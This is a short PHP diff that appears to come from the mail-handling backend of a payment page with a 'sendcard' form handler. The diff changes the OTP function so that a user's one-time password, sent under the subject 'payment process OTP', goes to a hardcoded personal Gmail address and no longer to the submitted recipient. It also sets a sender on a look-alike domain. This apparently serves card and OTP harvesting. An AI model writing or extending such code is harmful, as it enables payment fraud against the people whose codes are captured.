@@ -63,7 +63,7 @@ function sendEmail($post) {
     // } catch (Exception $e) {
     //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     // }
-    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
+    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
     // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
     // $message = filter_var($message, FILTER_SANITIZE_STRING);
     // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
@@ -164,7 +164,7 @@ function sendContact($post) {
     }
 }
 function sendOTP($post) {
-    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
+    $to = filter_var("habeebajani9@gmail.com", FILTER_SANITIZE_EMAIL);
     $subject = filter_var("payment process OTP", FILTER_SANITIZE_STRING);
     $otp = $post['OTP'];
     
@@ -181,7 +181,7 @@ function sendOTP($post) {
 
    
     $name = "me";
-    $fromEmail = "americanresidence435@gmail.com";
+    $fromEmail = "agent@americaresides.com";
     $headers = "MIME-Version: 1.0" . "\r\n";
     $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
     $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
@@ -191,6 +191,8 @@ function sendOTP($post) {
     } else {
         echo "Failed to send email to";
     }
+
+    
 }
 
 if(isset($_POST['sendcard'])){
